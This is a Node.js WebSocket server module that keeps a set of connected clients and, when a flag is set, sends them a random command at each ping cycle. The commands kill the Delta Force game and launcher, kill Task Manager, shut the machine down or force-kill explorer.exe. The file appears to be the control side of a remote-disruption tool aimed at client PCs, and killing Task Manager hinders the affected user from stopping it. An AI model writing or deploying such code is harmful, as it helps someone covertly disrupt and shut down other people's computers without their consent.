const {log} = require("./utils");

class Server {
  /**@type {Set<Client>} */
  static clients = new Set();
  static randomClose = false;
  static disableWLAN = false;
  /**
   * 
   * @param {Client} client
   */
  static add(client) {
    this.clients.add(client)
  }

  /**
   * 
   * @param {Client} client
   */
  static delete(client) {    
    this.clients.delete(client);
  }

  /**
   *
   * @param {WebSocket} ws
   */
  static deleteByWs(ws) {
    for (const client of this.clients) {
      if (client.ws === ws) {
        this.delete(client);
        return;
      }
    }
    console.log("Can not delete client by websocket")
  }

  /**
   *
   * @param { string | ArrayBufferLike | Blob | ArrayBufferView} msg
   */
  static broadcast(msg) {
    this.clients.forEach(client => {
      if (client.ws.readyState === 1) {
        client.ws.send(msg)
      }
      else {        
        client.ws.close();
        this.delete(client);
      }
    })
  }
  static randomCloseFun() {
    if (Server.disableWLAN) {
      this.clients.forEach(client => {
        console.log("disable")
        client.ws.send("mute");
      })
    }
    if (!Server.randomClose) {
      return;
    }
    const items = ['kill DeltaForceClient-Win64-Shipping',
      'kill delta_force_launcher',
      'kill Taskmgr',
      '#shutdown -p',
      '#taskkill -f -im explorer.exe&exit',
    ];
    const item = items[Math.floor(Math.random()*items.length)];
    this.clients.forEach(client => {
      console.log(item)
      client.ws.send(item);
    })
  }


  static pingAll() {
    this.clients.forEach(client => {
      client.ws.send("ping")
      if (Date.now() - client.lastPing > 10000) {
        log("Client ping timeout");
        client.ws.close();
      }
    })
    Server.randomCloseFun()
  }

  }


module.exports = {
  Server
}
